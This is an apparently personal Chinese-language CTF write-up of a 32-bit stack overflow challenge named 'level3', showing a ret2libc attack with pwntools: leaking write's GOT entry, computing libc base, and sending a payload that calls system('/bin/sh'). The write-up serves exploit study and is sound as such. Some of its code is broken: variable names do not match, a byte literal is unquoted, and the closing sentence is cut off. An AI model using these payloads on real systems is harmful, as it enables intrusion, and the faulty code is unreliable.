第一步：打开我们的 `IDA`，发现我们有一个栈溢出漏洞
![[Pasted image 20231206221950.png]]

第二步，检查是否存在 `system`, `\bin\sh` 发现都没有，那么我们就要先去 1. 找到我们的 `system` 函数的真实地址，2. 找到我们的 `\bin\sh` 字符串的地址或者找到我们的等价的 `sh`，或者把我们的 `\bin\sh` 写入到我们的某一个缓冲区中（gets (）), 或者我们从我们的 `libc` 文件中找到我们的对应字符。
```text
string level3 |grep sh
stirng libc-2.19.so|grep /bin/sh
```

第三步：想办法泄露我们的 `libc` 的**真实地址**，我们的想法一是构造我们的一个 `rop` 链，但是可惜我们不能成功，我们的函数不足。
![[Pasted image 20231206223055.png]]

第四步：之前的经验告诉我们的，如果我们有一个能打印我们的函数地址的工具，我们就可以拿到我们的 `libc` 的真实地址。
注意到我们再系统中存在一个指令 `write`，如果我们成功调用了这个指令，那么我们就能够成功的打印我们的给定的内容，但可惜的是，我们的 `gadget` 不足，我么无法实现。

第五步：再次观察我们的函数，我们发现，我们在函数中已经调用过一次我们的 `write`,
于是我们就可以通过 `rob` 得到我们的 `write` 的真实地址，我们的程序到我们的 `write@plt`,同时把我们的 `write` 对应的 `got` 地址得到。
总结：调用我们的 `write`，把我们的 `write` 的 `got` 表中的数据打出来，
我们于是就可以构造如下所示的脚本
```python
# 打开我们的文件
from pwn import *
io=remote('11.11.11',1)
libc=ELF('./lib/.....')
e=ELF('./level3')
# 获得我们的write的地址，第一次栈溢出
payload=cyclic(0x88+4)+p32(elf.plt["write"])+p32(elf.symbol["vulnerable_function"])+p32(1)+p32(elf.got["write"])+p32(4)#注意我们的参数是我们的倒序压入的，所以我们的第一个参数就是我们的1，第二个参数是我们的对应的值，第三个是我们的长度。
io.recv()
io.sendline(payload)
io.recv()
```

此时我们就能获得一个数据如下：
`\xc06\xe6\xf7`，然后我们的操作就是把这个换成我们的整数，就可以用我们的 `u32` 函数来进行
```python
write_addr=u32(\xc06\x36\xf7)
```

然后，我们就可以把这个地址当作我们的机制地址，然后我们再去根据我们的各种数据加加减减即可
```python
libc_base=write_addr-libc.symbols["write"];
system_addr=libc_base+libc.symbols["system"]
bin_sh_addr=libc_base+next(libc.search(b'/bin/sh'))
```

此时，因为我们仍然在我们的 `vulnerable` 函数中，我们就可以构造我们的一个新的 `payload`,来攻击哦我们的一个全新的

```python
payload2=cyclic(0x88+4)+p32(system_addr)+b'BBBB'+p32(bin_sh_addr)
```

